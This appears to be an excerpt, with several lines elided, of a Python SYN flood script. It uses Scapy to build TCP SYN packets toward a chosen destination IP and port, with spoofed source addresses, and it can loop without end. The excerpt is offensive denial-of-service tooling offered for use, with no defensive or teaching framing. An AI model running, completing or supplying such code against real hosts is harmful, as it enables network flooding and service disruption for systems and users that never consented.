...
if os.getuid() != 0: # Checks to see if the user running the script is root.
    ...
    sys.exit(1)
parser = argparse.ArgumentParser(description='Python script to perform a syn flood on a destination IP with variable sent packets, port specification and source address masking.')
parser.add_argument('-d', action="store",dest='destination', help='The destination IP address for the SYN packet')
parser.add_argument('-s', action="store",dest='source', help='The source IP address of the SYN packet, defaults to host IP if none specified')
...
if not args['source']:
    args['source'] = socket.gethostbyname(socket.gethostname())
...
if args['count'] == "X" or args['count'] == "x": # If the user entered an X or x into the count argument (wants unlimited SYN segments sent)
    while (1 == 1):
        a=IP(dst=args['destination'], src=args['source'])/TCP(flags="S",  sport=RandShort(),  dport=int(args['port'])) # Creates the packet and assigns it to variable a
